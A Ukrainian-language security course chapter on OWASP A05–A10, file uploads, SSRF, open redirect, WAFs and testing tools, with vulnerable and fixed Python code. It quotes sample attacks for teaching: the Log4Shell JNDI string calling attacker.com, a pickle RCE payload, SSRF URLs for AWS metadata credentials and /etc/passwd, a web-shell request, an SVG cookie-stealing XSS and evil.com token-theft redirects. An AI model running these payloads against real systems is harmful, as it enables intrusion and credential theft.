# 6.7. A05–A10: Security Misconfiguration, Components, Auth Failures, Integrity, Logging, SSRF

9 грудня 2021 року команда безпеки Alibaba повідомила Apache про вразливість у бібліотеці Log4j — стандартному Java-логері, що використовується у мільярдах систем. Рядок `${jndi:ldap://attacker.com/exploit}` у будь-якому полі, яке потрапляло у лог — URL, User-Agent, ім'я користувача — призводив до завантаження і виконання коду з сервера атакуючого. Без автентифікації, без складної техніки, без жодного знання системи. Log4Shell (CVE-2021-44228) CVSS 10.0. Це A06 у дії: вразливість не у вашому коді, а у залежності, яку ви не перевіряли. Але A05–A10 — ширше: вони охоплюють весь простір між «правильно написаним кодом» і «реальним захищеним застосунком».

> 📖 Ключові терміни — у [глосарії модуля](00-glosariy.md).

## A05: Security Misconfiguration

**Знайдена у 90% перевірених застосунків** — найпоширеніша за кількістю але часто «легка» вразливість: неправильна конфігурація, що залишає відкриті двері без необхідності у складній атаці.

**Типові сценарії:**

**1. Verbose error messages:**
```python
# ❌ Development помилки в production
DEBUG = True  # Flask/Django — показує stack trace клієнту!
# Stack trace розкриває: шляхи файлів, назви таблиць БД, версії бібліотек

# ✅ Production: власні сторінки помилок
@app.errorhandler(500)
def internal_error(e):
    logger.error(f"500 error: {e}", exc_info=True)  # логуємо деталі на сервері
    return jsonify({'error': 'Internal Server Error'}), 500  # клієнту — мінімум
```

**2. Default credentials:**
```
Типові дефолтні паролі (мають бути змінені до деплою!):
admin/admin, admin/password, admin/123456
root/root, sa/ (MS SQL), tomcat/tomcat
```
Сканер Shodan індексує мільйони пристроїв з дефолтними паролями.

**3. Непотрібні сервіси і порти:**
```bash
# Знайти відкриті порти
nmap -p- --min-rate=1000 target.example.com

# Типова помилка: phpMyAdmin або Adminer доступний з інтернету
# /phpmyadmin, /adminer.php, /pma — перші що перевіряє сканер
```

**4. Відсутня або слабка конфігурація безпеки фреймворку:**
```python
# ❌ Flask дефолти
app.config['SECRET_KEY'] = 'dev'         # слабкий ключ
app.config['SESSION_COOKIE_SECURE'] = False  # дефолт

# ✅ Production
app.config['SECRET_KEY'] = os.environ['SECRET_KEY']  # 32+ байт з urandom
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['WTF_CSRF_ENABLED'] = True
```

**5. Директорій listing:**
```nginx
# ❌ Nginx дефолт дозволяє index directories
location /uploads/ {
    autoindex on;  # ← бачимо всі завантажені файли!
}

# ✅
location /uploads/ {
    autoindex off;
}
```

**5. Небезпечне завантаження файлів (Unrestricted File Upload):**

```python
# ❌ ВРАЗЛИВО: приймаємо будь-який файл
@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    f.save(f'/var/www/html/uploads/{f.filename}')  # виконуваний у webroot!
    return 'Завантажено'

# ✅ ПРАВИЛЬНО: комплексна валідація
import magic  # pip install python-magic
from pathlib import Path
import uuid

ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.pdf'}
ALLOWED_MIME_TYPES = {'image/jpeg', 'image/png', 'image/gif', 'application/pdf'}
UPLOAD_DIR = Path('/var/uploads')   # ← ПОЗА webroot!
MAX_SIZE = 5 * 1024 * 1024          # 5 МБ

@app.route('/upload', methods=['POST'])
@login_required
def upload():
    f = request.files.get('file')
    if not f:
        abort(400)

    # 1. Обмеження розміру (також в Nginx: client_max_body_size 5m)
    f.stream.seek(0, 2)
    if f.stream.tell() > MAX_SIZE:
        abort(413)
    f.stream.seek(0)

    # 2. Перевірка розширення (whitelist, не blacklist)
    suffix = Path(f.filename).suffix.lower()
    if suffix not in ALLOWED_EXTENSIONS:
        abort(400, "Недозволений тип файлу")

    # 3. Перевірка MIME через magic bytes (не Content-Type від клієнта!)
    content = f.read(2048); f.seek(0)
    detected_mime = magic.from_buffer(content, mime=True)
    if detected_mime not in ALLOWED_MIME_TYPES:
        abort(400, "Невідповідний MIME-тип")

    # 4. Генерація безпечного імені (не зберігаємо ім'я від користувача!)
    safe_name = f"{uuid.uuid4()}{suffix}"
    dest = UPLOAD_DIR / safe_name
    f.save(dest)
    # Зберігаємо оригінальне ім'я у БД, не у файловій системі
    db.save_upload(user_id=current_user.id, path=safe_name, original=f.filename)
    return jsonify({'id': safe_name})
```

**Чек-лист безпечного File Upload:**
- Whitelist розширень і MIME (magic bytes, не заголовок від клієнта).
- Зберігати поза webroot — сервер не виконує файли, лише видає через ендпоінт.
- Перейменовувати в UUID — без оригінального імені від користувача у ФС.
- Обмежити розмір на рівні і застосунку, і сервера (Nginx `client_max_body_size`).
- Для зображень — прогнати через PIL/Pillow, що «переформатує» і знищить метадані.
- Для документів — розглянути антивірусне сканування (ClamAV).



**6. Небезпечне завантаження файлів (File Upload)**

Форми завантаження файлів — один з найпоширеніших векторів: зловмисник завантажує `.php`-шелл, SVG із `<script>`, або ZIP-bomb замість очікуваного зображення.

```python
import os, magic
from pathlib import Path
from flask import abort

UPLOAD_DIR = Path('/var/app/uploads')   # поза webroot!
MAX_SIZE_BYTES = 5 * 1024 * 1024        # 5 МБ
ALLOWED_MIME = {'image/jpeg', 'image/png', 'image/webp', 'application/pdf'}
ALLOWED_EXT  = {'.jpg', '.jpeg', '.png', '.webp', '.pdf'}

def safe_upload(file_storage):
    # 1. Перевірка розміру
    file_storage.seek(0, 2)
    if file_storage.tell() > MAX_SIZE_BYTES:
        abort(413, "Файл занадто великий")
    file_storage.seek(0)

    # 2. Перевірка розширення (whitelist)
    ext = Path(file_storage.filename).suffix.lower()
    if ext not in ALLOWED_EXT:
        abort(400, "Недозволений тип файлу")

    # 3. Перевірка MIME за Magic Bytes (не за Content-Type заголовком!)
    header = file_storage.read(2048)
    file_storage.seek(0)
    mime = magic.from_buffer(header, mime=True)
    if mime not in ALLOWED_MIME:
        abort(400, "Вміст файлу не відповідає розширенню")

    # 4. Безпечна назва файлу
    import secrets
    safe_name = secrets.token_hex(16) + ext
    dest = UPLOAD_DIR / safe_name
    file_storage.save(dest)
    return safe_name
```

Ключові принципи: зберігати файли **поза webroot**, роздавати через контрольований ендпоінт, перевіряти Magic Bytes (не лише розширення або `Content-Type`), генерувати нову безпечну назву замість довіряти `filename` від клієнта.

---

## A06: Vulnerable and Outdated Components

Якщо A05 про те, що ви неправильно налаштували власний код, то A06 — про те, що код чужих бібліотек, яким ви довіряєте, може мати власні вразливості. Залежності — невидима поверхня атаки: більшість застосунків містять сотні транзитивних залежностей, код яких ніхто не читав і не перевіряв. **Log4Shell (CVE-2021-44228)** — вразливість у Java-бібліотеці Log4j, що дозволяла Remote Code Execution через один рядок у логах — стала найгірчою вразливістю 2021 року і вразила мільйони серверів.

**SCA: Software Composition Analysis** — автоматизований аналіз залежностей на відомі CVE:

```bash
# Python: pip-audit або safety
pip install pip-audit
pip-audit

# Node.js
npm audit
npm audit fix

# Java: OWASP Dependency Check
./dependency-check.sh --project "MyApp" --scan ./lib

# GitHub Dependabot — автоматичні PR для оновлення вразливих залежностей
# (увімкнути у Settings → Security → Dependabot)
```

**SBOM (Software Bill of Materials)** — машиночитаний список всіх компонентів застосунку з їх версіями:

```bash
# Генерація SBOM у форматі CycloneDX (Python)
pip install cyclonedx-bom
cyclonedx-py -e -o sbom.json

# У форматі SPDX (Node.js)
npx @cyclonedx/cyclonedx-npm --output-file sbom.xml
```

**Управління залежностями:**
- Фіксуйте версії залежностей (`requirements.txt`, `package-lock.json`).
- Підписуйте артефакти (npm provenance, PyPI attestations).
- Перевіряйте `pip install` зі звіркою hash: `pip install --require-hashes -r requirements.txt`.
- Не встановлюйте бібліотеки з тиражуванням відомих (typosquatting: `requets` замість `requests`).

---

## A07: Identification and Authentication Failures

**Типові збої автентифікації у вебзастосунках:**

**1. Слабке управління сесіями:**
```python
# ❌ Передбачуваний session ID
session_id = f"session_{user.id}_{int(time.time())}"  # тривіально передбачити

# ✅ Криптографічно випадковий токен
import secrets
session_id = secrets.token_urlsafe(32)  # 256 біт ентропії
```

**2. Відсутність інвалідації сесії при виході:**
```python
# ❌ Видаляємо cookie лише на клієнті — на сервері сесія існує
@app.route('/logout')
def logout():
    response = redirect('/')
    response.delete_cookie('session')
    return response  # ← session_id ще дійсний на сервері!

# ✅ Анулюємо сесію на сервері
@app.route('/logout')
def logout():
    session_store.delete(session['session_id'])  # видалити з Redis/БД
    session.clear()
    return redirect('/')
```

**3. Відсутність Credential Stuffing захисту:**
```python
# ✅ Rate limiting на login endpoint
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # 5 спроб на хвилину з однієї IP
def login():
    ...
```

**4. User Enumeration через різні повідомлення:**
```python
# ❌ Розкриваємо, чи існує акаунт
if not user:
    return "Користувач не знайдений", 400
if not check_password(user, password):
    return "Неправильний пароль", 400

# ✅ Однакове повідомлення для обох випадків + constant-time
import time
FAKE_HASH = "$argon2id$v=19$m=65536,t=3,p=4$..."  # для constant-time при відсутньому user

def login(username, password):
    user = db.query(User).filter_by(username=username).first()
    # Завжди обчислюємо хеш — навіть якщо user не існує
    hash_to_check = user.password_hash if user else FAKE_HASH
    password_match = ph.verify(hash_to_check, password) if user else False

    if not user or not password_match:
        return "Невірне ім'я або пароль", 401  # ← однакове повідомлення
```

---

## A08: Software and Data Integrity Failures

**Два підкласи:**

### Небезпечна десеріалізація

```python
# ❌ pickle небезпечний для недовірених даних
import pickle
data = pickle.loads(request.data)  # RCE якщо request.data контрольований атакуючим

# Payload для RCE через pickle:
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())

# ✅ Використовуйте безпечні формати (JSON, MessagePack) з валідацією схеми
import json
from jsonschema import validate

data = json.loads(request.data)
validate(data, schema={'type': 'object', 'required': ['name'], ...})
```

### CI/CD і Supply Chain Attacks

**Атака на supply chain** — компрометація інструментів розробки або залежностей для впровадження шкідливого коду:

- **SolarWinds (2020):** зловмисники скомпрометували процес збірки ПЗ Orion → оновлення поширило бекдор до 18 000 клієнтів.
- **event-stream (2018):** зловмисник взяв підтримку популярного npm-пакету і додав код для крадіжки криптовалютних гаманців.
- **XZ Utils (2024):** 2-річна соціальна інженерія проти мейнтейнера → backdoor у xz-utils (в Linux-системах).

**Захист CI/CD:**
```yaml
# GitHub Actions: підписання артефактів (Sigstore/cosign)
- name: Sign artifact
  uses: sigstore/cosign-installer@v3
- run: cosign sign-blob --yes ./artifact.tar.gz

# Перевірка хешів dependencies
- name: Verify checksums
  run: sha256sum --check checksums.txt

# SLSA (Supply chain Levels for Software Artifacts) - рівні захисту
# SLSA Level 3: підписання + герметична збірка + SBOM
```

---

## A09: Security Logging and Monitoring Failures

**Середній час виявлення зламу** (dwell time) — 197 днів за даними IBM X-Force 2023. Систему можуть експлуатувати більше 6 місяців до виявлення — часто тому, що немає логів або ніхто їх не перевіряє.

**Що обов'язково логувати у вебзастосунку:**

```python
import logging
import json

# Структурований logging (JSON для SIEM)
logger = logging.getLogger('security')

# Обов'язкові події:
def log_security_event(event_type, user_id, resource, result, **extra):
    logger.info(json.dumps({
        'event': event_type,
        'user_id': user_id,
        'resource': resource,
        'result': result,
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'timestamp': datetime.utcnow().isoformat(),
        **extra
    }))

# Використання:
log_security_event('login_attempt', None, '/login', 'failed', username='alice@ex.com')
log_security_event('access_denied', current_user.id, '/admin/users', 'denied')
log_security_event('password_changed', current_user.id, '/profile', 'success')
log_security_event('mfa_bypass_attempt', current_user.id, '/login', 'blocked')
```

**Що НЕ логувати** (з розділу 6.4):
- Паролі (навіть хешовані)
- Повні номери карток (PAN)
- Session tokens (досить session_id без самого токена)
- API keys і secrets

**Моніторинг і алерти:**
- Понад 10 невдалих входів з однієї IP → alert.
- Вхід у незвичний час або з нової геолокації → підозра.
- Масовий download або export → alert.
- Поява нових адмін-акаунтів → негайний alert.

---

## A10: Server-Side Request Forgery (SSRF)

**SSRF** — вразливість, коли зловмисник змушує сервер виконати HTTP-запит на адресу, що він контролює. Сервер зсередини мережі може досягати ресурсів, недоступних зовні.

**Базовий сценарій:**

```python
# ❌ ВРАЗЛИВО: URL параметр без валідації
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    response = requests.get(url)  # ← url контрольований атакуючим!
    return response.content

# Атаки:
# /fetch?url=http://169.254.169.254/latest/meta-data/  ← AWS metadata (IAM keys!)
# /fetch?url=http://localhost:8080/admin               ← internal admin panel
# /fetch?url=http://internal-db:5432                   ← internal services
# /fetch?url=file:///etc/passwd                         ← local files (якщо підтримується)
```

**AWS Instance Metadata Service (IMDS)** — найпривабливіша ціль SSRF в хмарі: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` повертає тимчасові AWS credentials.

**IMDSv2 захищає:** потрібен PUT-запит для отримання token перед читанням метаданих — проста SSRF через GET не спрацьовує. Увімкнення IMDSv2 — **обов'язковий захід** для EC2.

```python
# ✅ Захист від SSRF: whitelist дозволених хостів
from urllib.parse import urlparse
import ipaddress

ALLOWED_DOMAINS = {'api.trusted-service.com', 'cdn.example.com'}
BLOCKED_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),      # loopback
    ipaddress.ip_network('10.0.0.0/8'),       # private
    ipaddress.ip_network('172.16.0.0/12'),    # private
    ipaddress.ip_network('192.168.0.0/16'),   # private
    ipaddress.ip_network('169.254.0.0/16'),   # link-local (metadata!)
]

def safe_fetch(url: str) -> bytes:
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError(f"Domain not allowed: {parsed.hostname}")
    # Додатково: перевірити IP після резолюції DNS (DNS rebinding protection)
    ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
    for blocked in BLOCKED_RANGES:
        if ip in blocked:
            raise ValueError(f"IP {ip} is in blocked range")
    return requests.get(url, timeout=5).content
```

**DNS Rebinding** — обхід IP-перевірки: у першому DNS-запиті повертається публічний IP (проходить whitelist), у другому — приватний. Захист: перевіряти IP після резолюції і підтверджувати при підключенні.

---

## Безпека завантаження файлів

Небезпечний File Upload — поширений вектор, що не вміщується в одну OWASP категорію, але охоплюється кількома: A03 (виконання шкідливого файлу), A05 (неправильна конфігурація збереження), A01 (недостатня перевірка прав). Варто розглядати окремо через специфіку типових помилок.

**Вектори атак:**
- **Web shell:** завантаження `.php/.jsp` файлу → RCE. `GET /uploads/shell.php?cmd=id`
- **Stored XSS через SVG:** `<svg><script>alert(document.cookie)</script></svg>` — виконується при відкритті.
- **Path traversal у назві:** `filename = "../../etc/cron.d/backdoor"` — файл йде за межі upload-директорії.
- **DoS через zip-bomb:** 42 МБ архів → 4.5 ГБ після розпакування.

**Захист (багаторівневий):**

```python
import os, magic, uuid
from pathlib import Path
from PIL import Image

UPLOAD_DIR = Path('/var/app/uploads')  # ПОЗА webroot!
MAX_SIZE = 10 * 1024 * 1024
ALLOWED_MIME = {'image/jpeg', 'image/png', 'image/gif', 'application/pdf'}
ALLOWED_EXT  = {'.jpg', '.jpeg', '.png', '.gif', '.pdf'}

def safe_upload(file_obj, original_filename: str) -> str:
    # 1. Перевірка розміру
    file_obj.seek(0, 2)
    if file_obj.tell() > MAX_SIZE:
        raise ValueError("Файл занадто великий")
    file_obj.seek(0)

    # 2. Whitelist розширення
    ext = Path(original_filename).suffix.lower()
    if ext not in ALLOWED_EXT:
        raise ValueError(f"Недозволений тип: {ext}")

    # 3. Magic Bytes (реальний тип, не тільки розширення)
    mime = magic.from_buffer(file_obj.read(2048), mime=True)
    file_obj.seek(0)
    if mime not in ALLOWED_MIME:
        raise ValueError(f"MIME невідповідність: {mime}")

    # 4. Re-encode зображень через Pillow (знищує embedded payload)
    if mime.startswith('image/'):
        img = Image.open(file_obj).convert('RGB')
        file_obj.seek(0)

    # 5. UUID-ім'я — не від клієнта!
    safe_name = f"{uuid.uuid4().hex}{ext}"
    with open(UPLOAD_DIR / safe_name, 'wb') as f:
        file_obj.seek(0)
        f.write(file_obj.read())
    return safe_name
```

**Чек-лист:**
- [ ] Whitelist типів (розширення + Magic Bytes), не blacklist.
- [ ] Файли поза webroot.
- [ ] Ім'я файлу генерується UUID, не береться від клієнта.
- [ ] Зображення re-encode через бібліотеку.
- [ ] Content-Type при видачі встановлюється явно (`application/octet-stream`).


## WAF: Web Application Firewall

**WAF (Web Application Firewall)** — спеціалізований фаєрвол, що аналізує HTTP/HTTPS-трафік і блокує запити, характерні для відомих атак: SQL-ін'єкцій, XSS, path traversal, SSRF та інших категорій OWASP Top 10.

На відміну від мережевого фаєрвола (що фільтрує за IP/портами) і NGFW (що аналізує протоколи), WAF «розуміє» HTTP-семантику — параметри форм, заголовки, cookie, тіло запиту.

**Типи WAF:**
- **Хмарний (Cloud WAF):** Cloudflare WAF, AWS WAF, Fastly — підключається через зміну DNS; мінімальна інфраструктура.
- **Апаратний або VM:** F5 BIG-IP, Imperva — для on-premise.
- **Програмний/Open Source:** **ModSecurity** (для Nginx/Apache) + **OWASP Core Rule Set (CRS)** — стандартний безкоштовний варіант.

```nginx
# Nginx + ModSecurity + OWASP CRS — мінімальна конфігурація
# (після встановлення modsecurity-nginx і завантаження CRS)

modsecurity on;
modsecurity_rules_file /etc/nginx/modsecurity/modsecurity.conf;
modsecurity_rules_file /etc/nginx/modsecurity/crs-setup.conf;
modsecurity_rules_file /etc/nginx/modsecurity/rules/*.conf;
```

**Режими WAF:**
- **Detection Mode:** логує потенційні атаки, не блокує. Для початкового налаштування і зниження false positives.
- **Prevention Mode:** блокує підозрілі запити. Вмикати після настроювання під конкретний застосунок.

**Обмеження WAF:** WAF — додатковий шар захисту, а не заміна безпечного коду. Параметризовані запити захищають від SQLi краще, ніж WAF; WAF не захищає від business logic flaws; кастомні payload можуть обходити правила.

## Інструменти тестування безпеки вебзастосунків

Безпека — це не лише «написати правильний код», але й «знайти неправильний перед тим, як його знайдуть зловмисники». Інструменти тестування безпеки діляться на кілька категорій.

### SAST: статичний аналіз коду

**SAST (Static Application Security Testing)** — аналіз вихідного коду без запуску:

| Інструмент | Мова | Тип | Особливості |
|---|---|---|---|
| **Bandit** | Python | OSS | Пошук типових вразливостей Python |
| **Semgrep** | Більшість | OSS/SaaS | Гнучкі правила, підтримка OWASP |
| **SonarQube** | Більшість | SaaS/OSS | Інтеграція з CI/CD, debt tracking |
| **CodeQL** | Більшість | OSS (GitHub) | Семантичний аналіз, вбудований у GitHub |
| **ESLint Security** | JS/TS | OSS | Плагін для виявлення XSS, eval тощо |

```bash
# Bandit для Python
pip install bandit
bandit -r ./src -f json -o bandit_report.json

# Semgrep
semgrep --config=p/owasp-top-ten ./src
```

### DAST: динамічне тестування

**DAST (Dynamic Application Security Testing)** — тестування запущеного застосунку «ззовні»:

| Інструмент | Тип | Що перевіряє |
|---|---|---|
| **OWASP ZAP** | OSS | Повноцінний DAST; spider, active scan, API scan |
| **Burp Suite Community/Pro** | OSS/Commercial | Proxy, scanner, intruder, repeater |
| **Nikto** | OSS | Веб-сервер misconfiguration |
| **Nuclei** | OSS | Шаблонний сканер CVE/misconfiguration |
| **SQLMap** | OSS | Автоматизований SQLi (лише на власних системах!) |

```bash
# OWASP ZAP — headless сканування
docker run -t owasp/zap2docker-stable zap-baseline.py \
    -t https://target-app.example.com \
    -r zap-report.html

# Nikto
nikto -h https://target-app.example.com -ssl

# Nuclei
nuclei -u https://target-app.example.com -t ~/nuclei-templates/
```

### Burp Suite: основний інструмент веб-пентестера

**Burp Suite** (PortSwigger) — proxy між браузером і сервером, що дозволяє перехоплювати, аналізувати і модифікувати HTTP-запити:

```
Browser → Burp Proxy (127.0.0.1:8080) → Target Server

Основні модулі:
- Proxy: перехоплення і зміна запитів
- Repeater: повторне надсилання зі змінами (ручне тестування SQLi, XSS)
- Intruder: автоматизований fuzzing параметрів (brute force, перебір ID)
- Scanner (Pro): автоматичний пошук вразливостей
- Decoder: encode/decode URL, Base64, Hex
- Comparer: порівняння відповідей
```

**Безкоштовна Community Edition** достатня для ручного тестування і навчання. **Professional Edition** ($449/рік) додає автоматичний scanner.

### SCA: аналіз залежностей

Детально розглянутий у підрозділі A06 вище. Основне: `pip-audit`, `npm audit`, `OWASP Dependency-Check`.

### Зв'язок тестування з OWASP Top 10

| OWASP Категорія | SAST | DAST | Ручне тестування |
|---|---|---|---|
| A01: Broken Access Control | Обмежено | IDOR через Burp | Обов'язково |
| A02: Cryptographic Failures | Bandit/Semgrep | SSL Labs | Перегляд конфіг |
| A03: Injection | Semgrep/Bandit | SQLMap, ZAP | Burp Repeater |
| A05: Misconfiguration | — | Nikto, ZAP | Security Headers check |
| A06: Outdated Components | SCA | Nuclei CVE | Dependency-Check |
| A07: Auth Failures | — | ZAP Auth | Burp Intruder |
| A08: Integrity | — | — | SBOM review |
| A10: SSRF | Semgrep | Burp Collaborator | Code review |

> **Secure SDLC інтеграція:** SAST запускається в CI/CD при кожному PR; DAST — в staging перед кожним релізом; ручне пентестування — щоквартально або перед major release. Критерій: жодного Critical/High CVSS перед деплоєм у production.

---

## Безпека файлового завантаження (File Upload Security)

Форми завантаження файлів — одна з найбільш недооцінених поверхонь атаки. Якщо застосунок дозволяє завантажувати файли і не валідує їх належним чином, зловмисник може завантажити PHP-шелл, SVG з вбудованим JavaScript, або EICAR-подібний payload і отримати виконання коду на сервері.

**Вектори атак на файловий upload:**

| Атака | Механізм | Захист |
|---|---|---|
| **Shell upload** | `.php`, `.jsp`, `.asp` замість зображення | Whitelist розширень + зберігати поза webroot |
| **SVG XSS** | SVG з `<script>` тегом | Не відображати SVG inline; sanitize |
| **MIME confusion** | `.jpg` файл з PHP-вмістом | Magic Bytes перевірка, не довіряти Content-Type |
| **Double extension** | `shell.php.jpg` | Strip або normalize розширення |
| **Path traversal** | `../../etc/passwd` у filename | `os.path.basename()` + рандомне ім'я |
| **DoS** | 10 ГБ файл | `MAX_CONTENT_LENGTH` ліміт |
| **Zip Bomb** | архів 5 КБ → 10 ГБ розпакований | Ліміт розпакованого розміру |

**Захищений upload (Python/Flask):**

```python
import os, magic, secrets
from pathlib import Path
from flask import request, abort
from PIL import Image  # pip install pillow

ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.pdf', '.docx'}
ALLOWED_MIME_TYPES  = {'image/jpeg', 'image/png', 'image/gif', 'application/pdf'}
MAX_FILE_SIZE       = 10 * 1024 * 1024  # 10 МБ
UPLOAD_DIR          = Path('/var/app/uploads')  # ПОЗА webroot!

def validate_upload(file) -> str:
    """Повертає безпечне ім'я файлу або кидає виняток."""
    # 1. Ліміт розміру (перевіряти до читання вмісту)
    file.seek(0, 2)
    if file.tell() > MAX_FILE_SIZE:
        abort(413, "Файл занадто великий")
    file.seek(0)

    # 2. Whitelist розширення (з оригінального імені — лише для UX)
    original_name = Path(file.filename).name  # basename: захист від path traversal
    suffix = Path(original_name).suffix.lower()
    if suffix not in ALLOWED_EXTENSIONS:
        abort(400, f"Недозволений тип файлу: {suffix}")

    # 3. Magic Bytes перевірка (реальний тип, а не MIME-заголовок)
    header = file.read(2048)
    file.seek(0)
    detected_mime = magic.from_buffer(header, mime=True)
    if detected_mime not in ALLOWED_MIME_TYPES:
        abort(400, f"Вміст файлу не відповідає типу: {detected_mime}")

    # 4. Для зображень: re-encode через Pillow (знищує metadata і payload)
    if detected_mime.startswith('image/'):
        try:
            img = Image.open(file)
            img.verify()
            file.seek(0)
            img = Image.open(file)
            # Зберігати через Pillow — видаляє EXIF і будь-який payload
        except Exception:
            abort(400, "Пошкоджене зображення")

    # 5. Рандомне ім'я (без оригінального) + збереження поза webroot
    safe_name = secrets.token_hex(16) + suffix
    return safe_name

@app.route('/upload', methods=['POST'])
@login_required
def upload_file():
    f = request.files.get('file')
    if not f:
        abort(400)
    safe_name = validate_upload(f)
    dest = UPLOAD_DIR / safe_name
    f.save(dest)
    # ← повертаємо внутрішній ID, НЕ шлях до файлу
    return jsonify({'file_id': safe_name})
```

---

## Open Redirect

**Open Redirect** — вразливість, де параметр `redirect`, `next` або `url` у запиті дозволяє перенаправити користувача на довільний домен. Здається незначною, але є потужним інструментом для фішингу: жертва бачить у рядку адреси довірений домен, а потрапляє на сайт зловмисника.

```
# Вразливий URL:
https://bank.com/login?next=https://evil.com/phish

# Жертва логіниться на bank.com → перенаправляється на evil.com
# URL-рядок браузера під час логіну: bank.com → виглядає легітимно
```

**Реальний кейс — OAuth abuse:** Open Redirect у `redirect_uri` може повністю обійти OAuth-перевірку: зловмисник підставляє `redirect_uri=https://bank.com/logout?next=https://evil.com` — і access token надходить на evil.com після OAuth-автентифікації на bank.com.

**Захист:**

```python
from urllib.parse import urlparse, urljoin

ALLOWED_REDIRECT_HOSTS = {'example.com', 'app.example.com'}

def safe_redirect(target: str, default: str = '/') -> str:
    """Дозволяємо redirect лише на whitelist хостів або відносні URL."""
    parsed = urlparse(target)
    # Відносний URL (без scheme і netloc) — безпечний
    if not parsed.netloc and not parsed.scheme:
        return target or default
    # Абсолютний URL — лише якщо хост у whitelist
    if parsed.netloc in ALLOWED_REDIRECT_HOSTS:
        return target
    return default  # заблокувати і повернути дефолт

# Використання
next_url = request.args.get('next', '/')
return redirect(safe_redirect(next_url))
```

---

## Украïнський контекст: атаки на вебзастосунки

**Дефейс держсайтів (Січень 2022).** Напередодні повномасштабного вторгнення зловмисники (атрибутовані до Sandworm/APT44 і пов'язаних угруповань) скомпрометували десятки українських державних вебсайтів. Вектор — SQL Injection і відомі CVE у CMS October/Drupal, що не були вчасно пропатчені. На сторінках з'являлось повідомлення «Бійтесь і очікуйте найгіршого». CERT-UA (CERT-UA#1261) закликав перейти на статичні версії або посилити WAF-захист.

**Практичні висновки:** навіть державні системи роками не оновлювали CMS-компоненти; відсутність WAF і File Upload обмежень дозволила швидку компрометацію. Модуль A06 (Outdated Components) і A05 (Misconfiguration) — не абстракція, а реальний вектор для організацій в Україні.

**CERT-UA рекомендації для вебзастосунків** (cert.gov.ua):
- Регулярне оновлення CMS і плагінів (пріоритет — критичні CVE протягом 24–48 годин).
- WAF перед всіма публічними вебсайтами.
- File Upload: зберігати поза webroot, обмежити типи файлів.
- Обов'язковий аудит публічних вебресурсів перед значущими датами (вибори, річниці).

```python
# Чек-лист A05-A10
checks = {
    'DEBUG=False': not app.config.get('DEBUG'),
    'SECRET_KEY надійний': len(app.config.get('SECRET_KEY', '')) >= 32,
    'CSRF захист': app.config.get('WTF_CSRF_ENABLED', False),
    'Session cookie Secure': app.config.get('SESSION_COOKIE_SECURE', False),
    'Session cookie HttpOnly': app.config.get('SESSION_COOKIE_HTTPONLY', False),
}
for check, result in checks.items():
    print(f"{'✅' if result else '❌'} {check}")
```

## Джерела та додаткові матеріали

- OWASP, *A05–A10:2021* — офіційні описи категорій.
- OWASP, *SSRF Prevention Cheat Sheet*.
- OWASP, *Logging Cheat Sheet*.
- OWASP, *File Upload Cheat Sheet*.
- OWASP Dependency-Check (jeremylong.github.io/DependencyCheck).
- pip-audit (pypi.org/project/pip-audit).

> **Далі по модулю:** A03 (Injection) охоплює XSS — але Cross-Site Scripting є настільки поширеним і різноманітним, що заслуговує на власний детальний розгляд. Три типи XSS, реальний кейс British Airways і CSP-захист — у [6.8. XSS →](08-xss.md)

---

> У цьому розділі ми охопили шість категорій OWASP, кожна з яких є самостійним класом проблем. Але серед усіх вразливостей у A03 (Injection) є одна, що потребує окремого детального розгляду: XSS. Не тому що вона складніша за SQL-ін'єкцію технічно, а тому що вона атакує **браузер жертви**, а не сервер — і захист від неї потребує розуміння і серверного, і клієнтського контексту одночасно.

**Попередній розділ:** [6.6. A04: Insecure Design](06-a04-insecure-design.md)
**Далі:** [6.8. XSS: Cross-Site Scripting](08-xss.md)
**Назад до модуля:** [README модуля 06](README.md)
